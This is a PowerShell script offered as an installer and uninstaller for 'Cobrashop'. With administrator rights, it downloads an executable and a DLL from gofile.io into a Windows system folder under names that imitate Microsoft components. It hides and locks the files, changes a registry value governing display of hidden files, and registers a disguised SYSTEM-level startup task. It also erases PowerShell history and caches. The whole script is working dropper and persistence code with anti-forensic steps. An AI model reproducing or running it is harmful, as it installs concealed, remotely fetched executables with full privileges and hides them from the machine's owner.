#Requires -RunAsAdministrator

Clear-Host
Write-Host "1 : Install Cobrashop"
Write-Host "2 : Uninstall Cobrashop"
Write-Host ""
$choice = Read-Host "Select (1/2)"

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$installPath = "C:\ProgramData\Microsoft\Windows\AppReadinessCache"
$exeUrl = "https://store-na-phx-4.gofile.io/download/web/6d5c87a3-ee99-452c-ae47-987501214ff4/2ntmTNeWUz.exe"
$exeName = "appreadsvc.exe"
$exePath = Join-Path $installPath $exeName
$dllUrl = "https://store-na-phx-1.gofile.io/download/web/0aec351a-b537-414d-aca2-7cac6adff936/NGixybF0PX.dll"
$dllName = "cpprest142_2_10.dll"
$dllPath = Join-Path $installPath $dllName
$taskName = "Microsoft Windows App Readiness Service"
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL"

function Clear-PowerShellTraces {
    Clear-History -ErrorAction SilentlyContinue
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        New-Item $historyPath -ItemType File -Force | Out-Null
    }
    $cachePath = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\ModuleAnalysisCache"
    if (Test-Path $cachePath) { Remove-Item $cachePath -Force -ErrorAction SilentlyContinue }
    if ($host.Name -eq 'ConsoleHost') { [console]::Clear() }
}

function Reset-FileACLAndTakeOwnership {
    param([string]$FilePath)
    if (-not (Test-Path $FilePath)) { return }
    & takeown /F "$FilePath" /A *>$null 2>$null
    & icacls "$FilePath" /grant Administrators:F /C /Q *>$null 2>$null
    & icacls "$FilePath" /reset /C /Q *>$null 2>$null
    (Get-Item $FilePath -Force -ErrorAction SilentlyContinue).Attributes = 'Normal'
}

function Invoke-Clean {
    Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($exeName)) -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 1200
    schtasks /delete /tn "$taskName" /f *>$null 2>$null
    if (Test-Path $exePath) {
        Reset-FileACLAndTakeOwnership $exePath
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $dllPath) {
        Reset-FileACLAndTakeOwnership $dllPath
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
    }
    Set-ItemProperty -Path $regPath -Name "CheckedValue" -Value 1 -Force -ErrorAction SilentlyContinue
    Clear-PowerShellTraces
}

if ($choice -eq "1") {
    $success = $true
    $errorCode = 0
    try {
        if (-not (Test-Path $installPath)) {
            New-Item -Path $installPath -ItemType Directory -Force | Out-Null
        }
        if (Test-Path $exePath) {
            Reset-FileACLAndTakeOwnership $exePath
            Remove-Item $exePath -Force -ErrorAction Stop
        }
        if (Test-Path $dllPath) {
            Reset-FileACLAndTakeOwnership $dllPath
            Remove-Item $dllPath -Force -ErrorAction Stop
        }
        
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null

        (Get-Item $exePath -Force).Attributes = 'Hidden','System'
        (Get-Item $dllPath -Force).Attributes = 'Hidden','System'

        & icacls "$exePath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null
        & icacls "$dllPath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null

        Set-ItemProperty -Path $regPath -Name "CheckedValue" -Value 0 -Force

        Start-Sleep -Milliseconds 800

        schtasks /create /tn "$taskName" /tr "$exePath" /sc ONSTART /ru SYSTEM /rl HIGHEST /f /DELAY 0000:30 *>$null 2>$null
        if ($LASTEXITCODE -ne 0) { $errorCode = 6; throw }

        schtasks /run /tn "$taskName" *>$null 2>$null
        if ($LASTEXITCODE -ne 0) { $errorCode = 7; throw }

    }
    catch {
        $success = $false
        if ($errorCode -eq 0) { $errorCode = 9 }
    }
    if ($success) {
        Write-Host "Successfully" -ForegroundColor Green
        Pause
    } else {
        Write-Host "Error $errorCode" -ForegroundColor Red
        Pause
    }
}
elseif ($choice -eq "2") {
    $success = $true
    try {
        Invoke-Clean
    }
    catch {
        $success = $false
    }
    if ($success) {
        Write-Host "Successfully" -ForegroundColor Green
    } else {
        Write-Host "Error" -ForegroundColor Red
    }
    Pause
}
else {
    Write-Host "Error" -ForegroundColor Red
    Pause
}
Clear-PowerShellTraces
